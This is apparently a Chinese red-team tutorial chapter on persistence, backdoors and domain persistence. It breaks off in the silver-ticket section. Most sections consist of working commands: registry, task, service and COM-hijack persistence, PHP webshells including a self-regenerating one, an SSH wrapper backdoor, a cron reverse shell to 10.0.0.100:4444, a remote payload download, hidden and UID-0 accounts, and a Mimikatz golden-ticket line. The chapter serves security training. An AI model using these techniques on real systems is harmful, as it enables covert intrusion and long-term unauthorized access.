---
outline: deep
---

# 第74章 权限维持与痕迹清理

> **难度等级**：🔴 特级
>
> **预计学习时间**：6 小时
>
> **前置知识**：
> - 熟悉 Windows/Linux 操作系统底层机制（注册表、服务、计划任务、日志体系）
> - 掌握 Active Directory 域环境基础（DC、Kerberos、NTDS.dit、SYSVOL）
> - 熟练使用 PowerShell、CMD、Bash 命令行
> - 了解常见 WebShell 编写与免杀基础
> - 具备红队后渗透阶段经验（建议先学习第 72、73 章）
> - 熟悉 MITRE ATT&CK 框架中 Persistence 与 Defense Evasion 战术
>
> **学习目标**：
> - 理解权限维持在红队攻击链中的战略地位与生命周期模型
> - 掌握 Windows 系统下 20 种以上权限维持手法，并能根据场景灵活选型
> - 熟练运用注册表、计划任务、服务、COM 劫持等经典维持技术
> - 能够编写与隐藏 WebShell、系统后门与隐藏账号
> - 掌握域环境下的 DCShadow、DSRM、Skeleton Key、黄金票据等高级维持手法
> - 学会 Windows/Linux/Web 三类日志的清理与定向篡改技术
> - 理解反取证原理（时间戳篡改、日志伪造、Timestomp、清除 USN 日志等）
> - 建立红队操作规范意识，做到"可解释、可回溯、可清理"

---

## 74.1 为什么需要权限维持？

> 💡 **大白话说权限维持——为什么拿到Shell后还要"埋钉子"？**
>
> 想象你是一个特工，成功潜入了敌人的大楼。你拿到了一把钥匙（Shell），但这把钥匙随时可能失效——大楼换了锁（系统重启）、保安巡逻发现了你（管理员排查）、或者门锁更新了（补丁修复）。
>
> 权限维持，就像是：
> - 你在多个隐蔽角落留下**备用钥匙**（注册表后门、计划任务）
> - 你贿赂了某个保安，约定**暗号**就能开门（隐藏账户）
> - 你在下水道留了**秘密通道**，别人不知道（WMI事件订阅）
>
> 用一句话概括：**一次成功的渗透不是"我进来了"，而是"我任何时候都能再进来"。**
>
> 为什么这么重要？因为真实红队评估持续数周甚至数月，你不可能24小时守着Shell不丢。你必须提前想好：万一我掉了，怎么再连回来？
>
> 就像下棋一样——高手不是看当前一步，而是提前布局三四十步。权限维持就是红队的"布局"。

### 74.1.1 权限维持的战略意义

在红队攻击链中，**权限维持（Persistence）** 是承上启下的关键环节。一旦攻陷目标并获得初始访问权限，这个权限往往是脆弱的——可能因系统重启、进程退出、管理员排查、补丁修复而丢失。权限维持的本质，是**在目标系统中植入一个或多个"复活点"**，使得攻击者能够在权限丢失后重新获取访问能力。

MITRE ATT&CK 框架将权限维持列为三大战术目标之一（Persistence / Privilege Escalation / Defense Evasion），其战略价值体现在：

| 维度 | 说明 |
|------|------|
| **存活能力** | 应对系统重启、进程崩溃、补丁更新导致的会话丢失 |
| **隐蔽性** | 伪装成正常系统组件，规避管理员与 EDR 的检查 |
| **冗余性** | 多点维持形成"复活链"，单点被发现不影响整体 |
| **长期性** | 红队长周期评估（数周至数月）需要稳定的回访通道 |
| **灵活性** | 不同维持点适配不同场景（Web/系统/域/用户级） |

> 💡 **红队箴言**：一次成功的入侵不是拿到 shell，而是**任何时候都能再次拿到 shell**。

### 74.1.2 权限维持的生命周期

权限维持并非"植入即结束"，而是一个完整的生命周期管理过程：

```
植入 → 验证 → 隐藏 → 维护 → （必要时）清理
 ↑                              ↓
 └────── 检测与更换 ←─── 失效/被发现
```

1. **植入阶段**：选择合适的维持点，编写后门并部署
2. **验证阶段**：重启/登出后验证维持是否生效
3. **隐藏阶段**：对维持点进行伪装（文件名、时间戳、属性）
4. **维护阶段**：定期检查存活，必要时更换维持方式
5. **清理阶段**：行动结束后清除所有维持点（红队规范）

### 74.1.3 维持技术的分类体系

按存活触发条件，权限维持可分为三大类：

**① 主动触发型**：需要用户操作（登录、打开文件）才激活
- 注册表 Run 键、启动文件夹、映像劫持、COM 劫持

**② 被动触发型**：由系统事件自动触发，无需用户干预
- 计划任务、服务、驱动、WMI 事件订阅

**③ 常驻型**：持续运行的后门进程
- WebShell、隐藏服务、rootkit

按权限层级可分为：

| 层级 | 典型技术 | 影响范围 |
|------|---------|---------|
| 用户级 | 启动项、Run 键、计划任务 | 单用户 |
| 系统级 | 服务、驱动、WMI、SSP | 全系统 |
| 域级 | 黄金票据、Skeleton Key、DCShadow | 整个域 |
| 固件级 | BIOS/UEFI 后门、硬件植入 | 跨系统重装 |

> ⚠️ **注意**：本章涉及的所有技术仅限授权红队评估与安全研究，未经授权使用属违法行为。

---

## 74.2 Windows 权限维持技术（20 种方法）

Windows 是红队评估中最常见的目标系统，其丰富的子系统（注册表、服务、COM、WMI、计划任务）为权限维持提供了大量攻击面。本节系统梳理 20 种经典维持手法。

> 💡 **大白话说20种维持方法——一张表看懂你在干什么**
>
> 这20种方法看起来很多，实际上可以分成四类：
>
> **第一类：启动项类（方法1-3）**——"趁开机混进去"
> 就像一个员工趁每天早上开门时趁机溜进办公室。用户登录的那一刻，你的后门跟着一起"上班"。
> 最简单但最容易被发现，适合临时使用。
>
> **第二类：伪装类（方法4、9、11、14）**——"穿上别人的制服"
> COM劫持就像偷了一件保安的衣服穿在身上，摄像头看到的是保安，实际是你。
> 映像劫持：你盯着"记事本"的图标双击，结果跑起来的是后门。
> 这类方法隐蔽性较高，因为后门寄生在合法程序里。
>
> **第三类：系统机制类（方法5-8、12-13、15-17）**——"篡改系统工作流程"
> WMI事件订阅就像你给公司的自动排班系统做了手脚——到点自动叫你的后门"来上班"。
> 计划和任务、服务、驱动，这些是Windows自己的"班车"，现在你劫持了它们的路线。
>
> **第四类：账户类（方法18-19）**——"伪造身份"
> 隐藏账户就像你伪造了一张员工卡，表面上系统中查不到你，但你刷卡照样进。
> RID劫持更狠——你把你的员工卡号改成和总经理一样。
>
> **选型口诀**：隐蔽性要求高→选COM劫持、WMI事件订阅；追求简单→选Run键、计划任务；追求高权限→选驱动、服务；域环境→必须上黄金/白银票据。

### 74.2.1 方法清单总览

| 编号 | 技术 | 触发方式 | 权限要求 | 隐蔽性 |
|------|------|---------|---------|--------|
| 1 | Run 注册表键 | 用户登录 | 用户 | 低 |
| 2 | RunOnce 注册表键 | 下次登录一次 | 用户 | 低 |
| 3 | 启动文件夹 | 用户登录 | 用户 | 低 |
| 4 | 映像劫持（IFEO） | 执行指定程序 | 管理员 | 中 |
| 5 | 计划任务 | 定时/事件 | 管理员 | 中 |
| 6 | 系统服务 | 系统启动 | 管理员 | 中 |
| 7 | 驱动程序 | 系统启动 | SYSTEM | 高 |
| 8 | WMI 事件订阅 | 事件触发 | 管理理员 | 高 |
| 9 | COM 劫持 | 调用 COM 组件 | 用户 | 高 |
| 10 | Logon Script | 用户登录 | 用户 | 中 |
| 11 | 屏幕保护程序 | 触发屏保 | 用户 | 中 |
| 12 | 助手程序（Helper） | 调用 netsh/regsvr32 | 管理员 | 高 |
| 13 | AppInit_DLLs | 加载 user32.dll | 管理员 | 中 |
| 14 | .NET CLR | 加载 .NET 程序 | 用户 | 高 |
| 15 | Print Monitor | 打印服务启动 | 管理员 | 高 |
| 16 | Time Provider | 时间同步 | 系统 | 高 |
| 17 | 安全支持提供者（SSP） | LSASS 加载 | 系统 | 高 |
| 18 | 隐藏账户 | 登录认证 | 管理员 | 中 |
| 19 | RID 劫持 | 用户登录 | SYSTEM | 高 |
| 20 | BITS 任务 | 后台传输 | 管理员 | 中 |

### 74.2.2 20 种方法详解

#### 方法 1：Run 注册表键（最经典）

`Run` 键是 Windows 最古老的启动项，用户登录时自动执行其中的程序。

```powershell
# 当前用户级（HKCU）—— 无需管理员权限
$payload = "C:\Users\Public\update.exe"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdate" -Value $payload

# 系统级（HKLM）—— 需要管理员权限，所有用户登录都触发
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsDefender" -Value $payload

# 验证
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**常见的 Run 键位置**：
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`（系统级）
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`（用户级）
- `HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`（32 位）
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`（执行一次后删除）

#### 方法 2：RunOnce 注册表键

`RunOnce` 与 `Run` 类似，但程序执行后键值会被自动删除，适合"一次性触发"场景：

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
    /v "Setup" /t REG_SZ /d "C:\Windows\Temp\setup.exe" /f
```

#### 方法 3：启动文件夹

启动文件夹内的快捷方式或可执行文件会在用户登录时自动运行：

```powershell
# 当前用户启动文件夹
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item C:\Users\Public\update.exe "$startup\update.lnk"

# 所有用户启动文件夹（需管理员）
$allStartup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

#### 方法 4：映像劫持（IFEO）

`Image File Execution Options`（映像劫持）通过 `Debugger` 键值，让指定程序启动时实际执行另一个程序：

```cmd
:: 当用户运行 notepad.exe 时，实际执行后门
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" ^
    /v Debugger /t REG_SZ /d "C:\Windows\Temp\backdoor.exe /x" /f
```

#### 方法 5：计划任务

计划任务是最灵活的维持方式，可基于时间、登录、事件等多种触发：

```powershell
# 创建登录即触发的计划任务（系统级）
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\update.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdateHelper" `
    -Action $action -Trigger $trigger -Principal $principal

# 创建每 30 分钟执行一次的任务
$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 30)
```

#### 方法 6：系统服务

创建系统服务，开机自启且以 SYSTEM 权限运行：

```cmd
:: 创建服务
sc create "WindowsDefenderUpdate" binPath= "C:\Windows\Temp\svc.exe" start= auto
:: 配置描述伪装成系统服务
sc description "WindowsDefenderUpdate" "Windows Defender 安全更新服务"
:: 启动
sc start "WindowsDefenderUpdate"
```

#### 方法 7：驱动程序

驱动级维持需通过数字签名（或测试模式），隐蔽性极高：

```cmd
:: 创建驱动服务
sc create "MyDriver" type= kernel binPath= "C:\Windows\System32\drivers\mydrv.sys" start= boot
```

#### 方法 8：WMI 事件订阅

WMI 事件订阅是隐蔽性极高的维持方式，不落地文件、不写注册表：

```powershell
# 事件过滤器：用户登录后 60 秒触发
$filterArgs = @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
}
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $filterArgs

# 事件消费者：执行后门
$consumerArgs = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "C:\Users\Public\update.exe"
}
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments $consumerArgs

# 绑定过滤器与消费者
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $bindingArgs
```

#### 方法 9：COM 劫持

COM 劫持通过修改注册表中 COM 组件的 `InprocServer32` 或 `LocalServer32`，让系统调用该组件时执行后门：

```powershell
# 劫持 TaskScheduler 的 COM 组件（系统频繁调用）
$clsid = "{0E2910F1-C5B6-4B8B-A5C5-3E8E1D3E8E8E}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32" `
    -Name "(Default)" -Value "C:\Users\Public\payload.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32" `
    -Name "ThreadingModel" -Value "Apartment"
```

#### 方法 10：Logon Script

通过修改用户登录脚本实现维持：

```cmd
:: 设置登录脚本
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\logon.bat" /f
```

#### 方法 11：屏幕保护程序

修改屏保程序指向后门，用户长时间无操作触发：

```cmd
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\Public\update.exe" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 60 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
```

#### 方法 12：netsh 助手

netsh 可加载自定义 helper DLL：

```cmd
netsh add helper C:\Windows\Temp\netshelper.dll
```

#### 方法 13：AppInit_DLLs

任何加载 `user32.dll` 的进程都会加载此处指定的 DLL：

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" ^
    /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" ^
    /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

#### 方法 14：.NET CLR

所有 .NET 程序启动时都会加载 CLR，可通过注册表注入 DLL：

```powershell
$key = "HKCU:\Software\Microsoft\.NETFramework"
New-Item -Path "$key\AppDomainManager" -Force
New-Item -Path "$key\AppDomainManager\Microsoft.Office.Interop.Outlook" -Force
Set-ItemProperty -Path "$key\AppDomainManager\Microsoft.Office.Interop.Outlook" `
    -Name "CodeBase" -Value "C:\Users\Public\clr.dll"
```

#### 方法 15：Print Monitor

打印监视器在 `spoolsv.exe`（SYSTEM）进程内加载 DLL：

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\evil" ^
    /v Driver /t REG_SZ /d "C:\Windows\Temp\monitor.dll" /f
:: 重启打印服务生效
net stop spooler & net start spooler
```

#### 方法 16：Time Provider

时间同步服务在系统启动时加载自定义 DLL：

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider\NtpClient" ^
    /v DllName /t REG_SZ /d "C:\Windows\Temp\time.dll" /f
```

#### 方法 17：SSP（安全支持提供者）

SSP 在 LSASS 进程内加载，可截获所有登录凭据：

```cmd
:: 添加 SSP（需重启生效）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" ^
    /v "Security Packages" /t REG_MULTI_SZ /d "msv1_0\n\negotiate\n\nkerberos\n\nsspns\n\nevil" /f
```

#### 方法 18：隐藏账户

通过在用户名末尾添加 `$` 创建不会在 net user 中显示的账户：

```cmd
net user hacker$ P@ssw0rd /add
net localgroup administrators hacker$ /add
:: net user 不会显示 hacker$，但"计算机管理"中可见
```

#### 方法 19：RID 劫持

通过修改注册表 `SAM` 中的 `F` 值，将低权限账户的 RID 改为 500（Administrator），实现隐藏管理员：

```powershell
# 需使用工具或直接操作 SAM 注册表（需 SYSTEM 权限）
# 工具：Invoke-RIDHijacking
Import-Module .\Invoke-RIDHijacking.ps1
Invoke-RIDHijacking -User "hacker" -RID 500
```

#### 方法 20：BITS 任务

BITS（后台智能传输服务）可创建后台下载任务，常被滥用为维持点：

```powershell
Start-BitsTransfer -Source "http://10.0.0.100/payload.exe" `
    -Destination "C:\Users\Public\payload.exe"
```

---

## 74.3 启动项/注册表/计划任务维持

### 74.3.1 注册表维持的深度解析

注册表是 Windows 维持的"主战场"。除 `Run` 键外，还有许多隐蔽的启动位置。

#### 启动位置全景表

| 位置 | 触发时机 | 权限 |
|------|---------|------|
| `HKLM\...\Run` | 任何用户登录 | 管理员 |
| `HKCU\...\Run` | 当前用户登录 | 用户 |
| `HKLM\...\RunOnce` | 下次登录（一次性） | 管理员 |
| `HKLM\...\RunServices` | 系统启动 | 管理员 |
| `HKLM\...\RunServicesOnce` | 系统启动（一次性） | 管理员 |
| `HKLM\...\Winlogon\Userinit` | 用户登录 | 管理员 |
| `HKLM\...\Winlogon\Shell` | 用户登录（Explorer 替换） | 管理员 |
| `HKLM\...\Winlogon\Notify` | 登录事件通知 | 管理员 |
| `HKLM\...\Winlogon\Taskman` | 登录后任务管理器 | 管理员 |
| `HKLM\...\Policies\Explorer\Run` | 组策略启动项 | 管理员 |
| `HKLM\...\Terminal Server\Run` | RDP 登录 | 管理员 |

#### Winlogon 维持示例

`Userinit` 键值在用户登录时执行，正常值为 `userinit.exe`，可在其后追加恶意程序：

```cmd
:: 查看原值
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
:: 默认: C:\Windows\system32\userinit.exe,

:: 追加后门（注意保留原值，逗号分隔）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\backdoor.exe" /f
```

`Shell` 键值默认为 `explorer.exe`，可改为"explorer.exe,backdoor.exe"实现维持：

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
    /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\backdoor.exe" /f
```

### 74.3.2 计划任务的进阶用法

计划任务支持丰富的触发器，是红队最常用的维持方式。

#### XML 定义计划任务

通过 XML 文件可定义复杂的计划任务，便于批量部署：

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
      </Repetition>
      <StartBoundary>2025-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>C:\Users\Public\update.exe</Command>
    </Exec>
  </Actions>
</Task>
```

注册任务：

```powershell
Register-ScheduledTask -Xml (Get-Content .\task.xml | Out-String) -TaskName "MicrosoftEdgeUpdateTaskMachineUA"
```

#### 隐藏计划任务

通过删除 SD（安全描述符）值，可在 `schtasks /query` 中隐藏任务：

```powershell
# 任务文件存储位置
$taskPath = "C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachineUA"
# 删除 SD 值后，schtasks /query 不再显示该任务
$xml = Get-Content $taskPath
$xml = $xml -replace '<SecurityDescriptor>.*?</SecurityDescriptor>', ''
$xml | Out-File $taskPath
```

### 74.3.3 SharPersist 工具实战

`SharPersist` 是红队常用的权限维持工具，封装了多种维持手法：

```bash
# 加密 payload
SharPersist -t reg -c "C:\Users\Public\payload.exe" -a "-debug" -k "dbglog" -v "dbg" -m add

# 计划任务维持
SharPersist -t schc -c "C:\Users\Public\payload.exe" -a "-debug" -n "UpdateTask" -m add

# 启动文件夹维持
SharPersist -t startupfolder -c "C:\Users\Public\payload.exe" -a "-debug" -f "Update" -m add

# 服务维持
SharPersist -t service -c "C:\Users\Public\payload.exe" -n "UpdateService" -m add
```

---

## 74.4 服务/驱动/COM 劫持维持

### 74.4.1 服务维持的进阶

普通服务容易被 `sc query` 发现，红队常用以下手法增强隐蔽性：

#### 伪装为系统服务

将服务名、描述、路径都伪装成合法系统服务：

```powershell
# 创建伪装成 Windows Update 的服务
sc.exe create "wuauserv_backup" binPath= "C:\Windows\Temp\wuauclt.exe" start= auto
sc.exe description "wuauserv_backup" "Enables the detection, download, and installation of updates for Windows and other programs."
```

#### 修改现有服务

比创建新服务更隐蔽的方式是修改已有的、禁用的或手动启动的合法服务：

```cmd
:: 查找禁用的服务
sc query type= service state= inactive | findstr SERVICE_NAME

:: 修改服务路径
sc config "SomeDisabledService" binPath= "C:\Windows\Temp\payload.exe" start= auto
sc start "SomeDisabledService"
```

#### 服务故障恢复

配置服务失败后自动执行程序，作为"备用维持"：

```cmd
sc failure "MyService" reset= 86400 actions= restart/5000/restart/5000/restart/5000
sc failure "MyService" command= "C:\Windows\Temp\recovery.exe"
```

### 74.4.2 驱动维持

驱动级维持运行在 Ring 0，权限最高、隐蔽性最强，但需要数字签名（或在测试模式下加载）。

#### 加载未签名驱动

```cmd
:: 启用测试签名模式（需重启）
bcdedit /set testsigning on

:: 加载驱动
sc create "evildrv" type= kernel start= demand binPath= "C:\Windows\Temp\evil.sys"
sc start "evildrv"
```

#### DSE Bypass（驱动签名强制绕过）

无签名时需使用 DSE 绕过工具，如 `EfiGuard`、`KDU`（Kernel Driver Utility）：

```powershell
# 使用 KDU 加载未签名驱动
KDU.exe -map evil.sys
```

### 74.4.3 COM 劫持深度解析

COM 劫持是最隐蔽的维持方式之一，因为：

1. **HKCU 优先于 HKLM**：在 HKCU 注册相同的 CLSID 会覆盖 HKLM，无需管理员权限
2. **系统频繁调用**：许多系统组件（如 TaskScheduler、Explorer）会调用 COM
3. **不落地可执行文件**：可以是一个 DLL，被宿主进程加载

#### COM 劫持目标选择

理想的劫持目标是"系统频繁调用、但管理员不常检查"的 COM 组件：

| CLSID | 组件 | 调用频率 |
|-------|------|---------|
| `{018D5C66-4533-4307-9B53-224DE2ED1FE6}` | 任务计划程序 | 高 |
| `{41E544D9-F01F-44C0-A83C-0D2D6B4A1FAD}` | Shell Icon | 高 |
| `{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` | Schedule Service | 高 |

#### 自动化 COM 劫持脚本

```powershell
function Invoke-COMHijack {
    param(
        [string]$CLSID = "{018D5C66-4533-4307-9B53-224DE2ED1FE6}",
        [string]$Payload = "C:\Users\Public\payload.dll"
    )
    
    $path = "HKCU:\Software\Classes\CLSID\$CLSID\InProcServer32"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "(Default)" -Value $Payload
    Set-ItemProperty -Path $path -Name "ThreadingModel" -Value "Apartment"
    
    Write-Host "[+] COM 劫持完成: $CLSID -> $Payload"
}

Invoke-COMHijack
```

---

## 74.5 后门技术（Web 后门/系统后门/账号后门）

> 💡 **大白话说后门——三把"万能钥匙"**
>
> 后门技术可以理解为三种不同场景的"备用钥匙"：
>
> **Web后门（WebShell）**：你在网站的"后厨"里藏了一把钥匙。只要网站还开着，你就能通过特殊的暗号（POST参数）打开后厨门。即使前后门都换了锁（打补丁、删账号），只要网站还在运行，你的后门就还在。
>
> **系统后门（SSH/Cron）**：你在房子的基础结构上动了手脚。比如你重装了楼下的门锁系统（SSH），让特定的"暗号"（源端口=0xdead）绕过认证直接开门。或者你贿赂了定时钟楼的管理员（Cron），让他每隔一小时打开后门一次。
>
> **账号后门（隐藏账户/克隆账户）**：你直接伪造了一个身份。在Windows中，用户名带`$`后缀就像身份证号末尾有个特殊标记——普通的`net user`命令看不到，但系统认证时照常放行。克隆账户更是直接把你的权限复制了管理员的"基因"（F值）。
>
> 三种后门各有用处：Web后门独立于系统、系统后门最隐蔽、账号后门使用最方便。高手会三种同时用，形成"多重保险"。

### 74.5.1 Web 后门（WebShell）

WebShell 是 Web 服务器上的维持利器，不依赖系统重启，只要 Web 服务运行即可访问。

#### 基础 PHP WebShell

```php
<?php
// 一句话木马
@eval($_POST['cmd']);
?>
```

#### 功能增强型 WebShell

```php
<?php
// 带密码验证的命令执行 WebShell
$password = "redteam2025";
if (isset($_POST['pass']) && $_POST['pass'] === $password) {
    $cmd = $_POST['cmd'];
    // 多种执行方式，绕过 disable_functions
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        echo exec($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } else {
        // 反引号执行
        echo `$cmd`;
    }
}
?>
```

#### 不死马（内存马）

"不死马"通过循环创建自身，即使文件被删除也会持续重生：

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);  // 删除自身，只在内存中运行

$file = '/tmp/.session.php';
$code = '<?php if(md5($_POST["pass"])=="5f4dcc3b5aa765d61d8327deb882cf99"){@eval($_POST["cmd"]);} ?>';

while (1) {
    file_put_contents($file, $code);
    usleep(10000);  // 每 10ms 重生一次
}
?>
```

#### Linux 内存马（Apache/nginx）

通过 `.htaccess` 或修改进程内存实现无文件 WebShell：

```apache
# .htaccess 后门：将特定 User-Agent 的请求转发到后门
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} ^Backdoor$
RewriteRule ^(.*)$ /tmp/.shell.php [L]
</IfModule>
```

### 74.5.2 系统后门

#### SSH 后门（Linux）

**软链接后门**：

```bash
# 创建到 PAM 认证的软链接，任意密码可登录
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=12345
# 连接：ssh root@target -p 12345（任意密码可登录）
```

**SSH Wrapper 后门**：

```bash
# 备份原 sshd
mv /usr/sbin/sshd /usr/sbin/sshd.bak

# 创建后门 sshd
cat > /usr/sbin/sshd << 'EOF'
#!/usr/bin/perl
exec "/bin/sh" if getpeername(STDIN) eq pack("H*","0000dead");
exec {"/usr/sbin/sshd.bak"} "/usr/sbin/sshd.bak", @ARGV;
EOF
chmod +x /usr/sbin/sshd

# 触发后门（特殊源端口）
socat STDIO TCP4:target:22,sourceport=0xdead
```

**PAM 后门**：修改 PAM 模块记录密码或植入万能密码。

**Cron 后门**：

```bash
# 添加定时反弹 shell
(crontab -l 2>/dev/null; echo "*/30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'") | crontab -
```

#### SSH 公钥后门

```bash
# 在目标 authorized_keys 中植入攻击者公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAA...攻击者公钥..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### 74.5.3 账号后门

#### Windows 隐藏账户

```cmd
:: 创建带 $ 的隐藏账户
net user admin$ P@ssw0rd123 /add
net localgroup administrators admin$ /add

:: 修改注册表，使账户不在"计算机管理"中显示
:: 需关闭"远程注册表"服务后操作 SAM
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\admin$" /t REG_SZ /d "" /f
```

#### 克隆账户

将 admin$ 账户的 F 值替换为 Administrator 的 F 值，实现权限克隆：

```powershell
# 需 SYSTEM 权限操作 SAM
# 1. 获取 Administrator 的 F 值
# 2. 将 admin$ 的 F 值改为相同
# 3. admin$ 即拥有 Administrator 权限
```

#### Linux 后门账户

```bash
# 添加 UID=0 的 root 级账户
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysbackup
echo "sysbackup:P@ssw0rd" | chpasswd
# /etc/passwd 中可见但不易被注意
```

---

## 74.6 域环境权限维持（DCShadow/DSRM 等）

域环境是红队评估的"终极目标"，域级维持意味着即使重装单台机器也无法清除后门。

> 💡 **大白话说域环境维持——几种"太上皇"级别的后门**
>
> 域环境维持为什么可怕？用一个"王国"的比喻来理解：
>
> **如果公司的AD域是一个王国**：
> - **域控（DC）** = 国王的宝座，谁坐上宝座谁就能号令全国
> - **krbtgt账户** = 国玺（盖章用的玉玺），给任何文件盖章就变成了"官方文件"
> - **Kerberos认证** = 文武百官每天上朝用的"通行令牌"系统
>
> 现在来看几种域级后门：
>
> **黄金票据（Golden Ticket）** = 你偷到了国玺。从此你可以给任意文件盖章——任何身份、任何权限。即使国王换了密码（重置用户密码），只要国玺没换（krbtgt密码没改），你的"伪造圣旨"依然有效。这就是为什么评估后要**两次重置krbtgt密码**——换一次国玺可能还有旧国玺的副本在流通。
>
> **白银票据（Silver Ticket）** = 你偷到了某个部门的专用印章。只对该部门有效，但不需要找国王盖章（不经过DC），更隐蔽。
>
> **Skeleton Key（万能钥匙）** = 你在国王的寝宫里装了一个"后门"——所有大臣上朝时，如果用特定密码（mimikatz），你就能冒充任何人进入朝堂。重启后失效，需要重新安装。
>
> **DSRM后门** = 域控本身有一个"紧急模式管理员"（类似手机会有个恢复模式密码），和域账户体系独立。你修改了这个密码，从此有了一条独立的秘密通道。
>
> **DCShadow** = 最高级的手段。你不是偷国玺，而是直接伪造了一个"假国王"，向全国发号施令。更难被检测，因为"真国王"也不知道有人在冒充他发命令。
>
> **AdminSDHolder后门** = 你修改了"王室血脉规则"。正常情况下，Domain Admins组每隔60分钟会自动从AdminSDHolder继承权限。你在AdminSDHolder里偷偷加了一条规则说"张三也是王子"，60分钟后全天下都认为张三是王子——他可以号令诸侯。

### 74.6.1 黄金票据（Golden Ticket）

**原理**：使用 `krbtgt` 账户的 NTLM Hash 签发 TGT 票据，可伪造任意域用户的身份，有效期默认 10 年。

**前提**：已获得 `krbtgt` 的 Hash（需 Domain Admin 权限导出 NTDS.dit）。

```powershell
# 使用 Mimikatz 生成黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-xxx /krbtgt:ntlm_hash /id:500 /ptt

# 验证
klist  # 查看 TGT
dir \\DC.corp.com\c$
```

**特点**：
- krbtgt 密码更改前永久有效（建议红队评估结束后修改两次）
- 可绕过 Kerberos 预认证
- 即使所有用户重置密码，票据依然有效

### 74.6.2 白银票据（Silver Ticket）

**原理**：使用服务账户的 NTLM Hash 直接签发 TGS 票据，无需与 DC 通信，更隐蔽。

```powershell
